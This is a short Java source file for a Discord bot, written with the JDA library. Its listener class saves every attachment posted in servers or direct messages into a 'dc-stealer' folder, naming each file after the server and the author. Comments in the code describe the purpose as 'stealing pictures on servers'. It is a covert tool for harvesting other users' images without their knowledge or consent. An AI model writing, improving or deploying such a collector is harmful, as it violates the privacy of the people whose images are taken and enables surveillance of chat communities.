package me.permafreez.Loggers;

import me.permafreez.Main;
import net.dv8tion.jda.api.entities.Message.Attachment;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;

public class Fucker extends ListenerAdapter {
	
	int number = 0;
	
	// MessageReceived method
	@Override
	public void onMessageReceived(MessageReceivedEvent event) {
		
		// Testing for attachment
		if (!event.getMessage().getAttachments().isEmpty()) {
			
		// Getting attachment
		Attachment attachment = event.getMessage().getAttachments().get(0);
		
		// Stealing pictures on servers
		try {
			String number2 = String.valueOf(number);
			attachment.downloadToFile(Main.folder + "dc-stealer/" + event.getGuild().getName() + "-" + event.getMessage().getAuthor().getName()  + "-" + number2 + "-" + attachment.getFileName())
			.thenAccept(file -> System.out.println("Saved attachment to " + file.getName()));
		// Not on servers
		}
		catch(Exception e) {
			String number2 = String.valueOf(number);
			attachment.downloadToFile(Main.folder + "dc-stealer/" + event.getMessage().getAuthor().getName() + "-" + number2 + "-" + attachment.getFileName())
			.thenAccept(file -> System.out.println("Saved attachment to " + file.getName()));}
			number++;
		}
	} 
}
